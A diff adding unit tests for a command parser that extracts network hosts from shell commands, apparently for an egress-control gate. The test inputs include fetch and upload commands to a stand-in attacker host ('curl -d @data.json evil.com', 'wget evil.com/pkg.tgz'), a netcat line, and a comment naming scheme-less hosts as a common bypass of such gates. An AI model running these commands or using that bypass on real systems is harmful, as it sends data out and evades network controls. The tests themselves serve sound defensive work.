@@ -37,4 +37,46 @@ describe("extractHostsFromCommand", () => {
     const cmd = "curl https://x.io https://y.io";
     assert.deepEqual(extractHostsFromCommand(cmd), extractHostsFromCommand(cmd));
   });
+
+  // Pass 2: scheme-less hosts passed positionally to curl/wget (the common egress-gate bypass).
+  it("extracts a scheme-less host given positionally to curl/wget", () => {
+    assert.deepEqual(extractHostsFromCommand("curl evil.com"), ["evil.com"]);
+    assert.deepEqual(extractHostsFromCommand("wget evil.com/pkg.tgz"), ["evil.com"]);
+    assert.deepEqual(extractHostsFromCommand("curl -sL example.org/x"), ["example.org"]);
+    assert.deepEqual(extractHostsFromCommand("nc example.net 443"), []); // nc is not a fetch tool
+  });
+
+  it("finds the fetch tool even when it is not the first token", () => {
+    assert.deepEqual(extractHostsFromCommand("sudo curl evil.com"), ["evil.com"]);
+  });
+
+  it("does NOT mistake value-flag arguments for hosts (no false positives)", () => {
+    // -o's value is a filename that looks host-shaped; only the real target must be extracted.
+    assert.deepEqual(extractHostsFromCommand("curl -o out.html https://api.acme.com"), [
+      "api.acme.com",
+    ]);
+    assert.deepEqual(extractHostsFromCommand("curl -d @data.json evil.com"), ["evil.com"]);
+    assert.deepEqual(
+      extractHostsFromCommand(`curl -H "Accept: application/json" https://api.acme.com`),
+      ["api.acme.com"],
+    );
+    assert.deepEqual(extractHostsFromCommand("wget -P out.dir https://cdn.acme.io/p"), [
+      "cdn.acme.io",
+    ]);
+  });
+
+  it("does not bleed across shell separators (only curl/wget segments contribute)", () => {
+    // `rm b.com` must not yield a host — rm is not a fetch tool.
+    assert.deepEqual(extractHostsFromCommand("curl a.com && rm b.com"), ["a.com"]);
+    assert.deepEqual(extractHostsFromCommand("echo evil.com | curl good.com"), ["good.com"]);
+  });
+
+  it("ignores schemeless targets without a dotted domain (localhost, bare words)", () => {
+    assert.deepEqual(extractHostsFromCommand("curl localhost:3000/health"), []);
+    assert.deepEqual(extractHostsFromCommand("curl -X POST myservice/health"), []);
+  });
+
+  it("merges explicit-URL and scheme-less hosts, deduped and sorted", () => {
+    assert.deepEqual(extractHostsFromCommand("curl https://a.com b.com a.com"), ["a.com", "b.com"]);
+  });
 });
